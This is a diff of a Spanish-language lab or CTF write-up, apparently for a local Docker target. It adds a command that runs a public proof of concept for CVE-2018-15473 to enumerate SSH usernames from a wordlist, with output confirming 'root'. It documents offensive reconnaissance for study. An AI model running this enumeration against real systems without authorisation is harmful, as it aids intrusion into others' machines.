@@ -39,15 +39,35 @@ Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
 
 ## SSH (22 TCP Port)
 
-Investigando el servicio vemos que es una vesiñon antigua que tiene una vulnerabilidad numerada como [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/cve-2018-15473) el cual nos permite una enumeración de usuarios. Con este [PoC](https://github.com/Sait-Nuri/CVE-2018-15473) y una lista de usuarios podemos conseguir que usuarios existen en el sistema
-
-
+Investigando el servicio vemos que es una versión antigua que tiene una vulnerabilidad numerada como [CVE-2018-15473](https://nvd.nist.gov/vuln/detail/cve-2018-15473) el cual nos permite una enumeración de usuarios. Con este [PoC](https://github.com/Sait-Nuri/CVE-2018-15473) y una lista de usuarios podemos conseguir que usuarios existen en el sistema
 
 ```
+> python2 CVE-2018-15473.py  172.17.0.2 -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
 
+/home/rh4ps00dy/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+  from cryptography.hazmat.backends import default_backend
+[+] root is a valid username
+[-] admin is an invalid username
+[-] test is an invalid username
+[-] guest is an invalid username
+[-] info is an invalid username
+[-] adm is an invalid username
+[-] mysql is an invalid username
+[-] user is an invalid username
+[-] administrator is an invalid username
+[-] oracle is an invalid username
+[-] ftp is an invalid username
+[-] pi is an invalid username
+[-] puppet is an invalid username
+[-] ansible is an invalid username
+[-] ec2-user is an invalid username
+[-] vagrant is an invalid username
+[-] azureuser is an invalid username
+Valid Users:
+root
 ```
 
-
+Desucribros
 
 ```
 
